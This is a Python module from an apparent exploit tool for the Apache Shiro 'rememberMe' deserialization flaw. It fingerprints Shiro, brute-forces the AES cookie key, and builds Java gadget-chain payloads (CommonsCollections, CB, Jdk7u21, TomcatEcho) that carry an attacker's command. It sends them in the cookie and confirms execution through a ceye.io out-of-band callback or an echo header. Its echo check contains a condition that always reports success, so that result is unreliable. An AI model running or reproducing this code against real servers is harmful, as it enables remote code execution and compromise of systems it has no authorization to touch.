import base64
import time
import requests
from core.DATA import  CheckHex,Key
from core.EnCrypt import CBC,GCM

C = ['CC2']
C1 = ['CCK1', 'CCK2']
C2 = ['CC3', 'CC4', 'CC8', 'CC10', 'CB']
C3 = [ 'Echo', 'CB1', 'CB2', 'Jdk7u21', "Jdk8u20", 'TomcatEchoK1' ]
Header = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'}
def getKey(AesWay,url):
    size = getSize(url)
    Hex = base64.b16decode(CheckHex)
    if AesWay == 'CBC':
        for key in Key:
          Text = CBC(key, Hex)
          #print(type(Text))
          Text = str(Text,'utf-8')
          #print(Text)
          a = Postway(Text,url,size)
          if a == 1:
             return key
    if AesWay == 'GCM':
        for key in Key:
          Text = GCM(key, Hex)
          Text = str(Text,'utf-8')
          a = Postway(Text,url,size)
          if a == 1:
             return key
def getSize(url):
    Cookie = {'rememberMe': 'Text'}
    Sizeway = requests.get(url=url, cookies=Cookie, headers=Header, allow_redirects=False, timeout=5)
    if 'rememberMe=deleteMe;' not in str(Sizeway.headers):
        print("Shiro not here")
        exit()
    return len(str(Sizeway.headers))
def Postway(Text,url,size):
    Text = str(Text)
    # (Text)
    Cookie = {'rememberMe': Text}
    Checkway = requests.get(url=url,cookies=Cookie,headers=Header,allow_redirects=False,timeout=5)
    if "rememberMe=deleteMe;" not in Checkway.headers and size != len(str(Checkway.headers)):
        return 1
    else:
        return 0


def getHex(payload,cmd,type):
    if type in C:
        return payload.format(
            arr='%04x' % int(hex(len(cmd) + 0x01DC).replace('0x', ''), base=16),
            len='%04x' % int(hex(len(cmd)).replace('0x', ''), base=16),
            cmd=base64.b16encode(cmd.encode('utf-8')).decode('utf-8')
        )
    elif type in C1:
        return payload.format(
            arr='%04x' % int(hex(len(cmd) + 0x01DE).replace('0x', ''), base=16),
            len='%04x' % int(hex(len(cmd)).replace('0x', ''), base=16),
            cmd=base64.b16encode(cmd.encode('utf-8')).decode('utf-8')
        )
    elif type in C2:
        return payload.format(
            arr='%04x' % int(hex(len(cmd) + 0x0698).replace('0x', ''), base=16),
            len='%04x' % int(hex(len(cmd)).replace('0x', ''), base=16),
            cmd=base64.b16encode(cmd.encode('utf-8')).decode('utf-8')
        )
    elif type in C3:
        return payload

    else:
        return payload.format(
            len='%04x' % int(hex(len(cmd)-1).replace('0x', ''), base=16),
            cmd=base64.b16encode(cmd.encode('utf-8')).decode('utf-8')
        )

def getPayload(payload,AesWay,key):
    payload1 = base64.b16decode(payload,True)
    if AesWay == 'CBC':
        Text = str(CBC(key, payload1), 'utf-8').strip()
        return Text
    if AesWay == 'GCM':
        Text = str(GCM(key, payload1), 'utf-8').strip()
        return Text

def getChainsTest(Text,url,randomceye,ceye,token):
    T = "http://api.ceye.io/v1/records?token="+token+"&type=http"
    Text = Text
    Cookie = {'rememberMe': Text}
    Checkway = requests.get(url=url, cookies=Cookie, headers=Header, allow_redirects=False, timeout=5)
    time.sleep(2.5)
    a = requests.get(url = T, headers=Header, allow_redirects=False, timeout=5)
    if randomceye in a.text :
        return 1
    else:
        return 0

def getChainsEchoTest(Text,url,cmd = "echo lzkbsh"):
    Header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
              'Testcmd': cmd,
              'Testecho': 'lzkbsh',
              'Connection': 'close'}
    Cookie = {'rememberMe': Text}
    Checkway = requests.get(url=url, cookies=Cookie, headers=Header, allow_redirects=False, timeout=5, verify=False, stream=True)
    time.sleep(3)
    if 'lzkbsh' or 'Testecho' in str(Checkway.headers):
        return 1
    else:
        return 0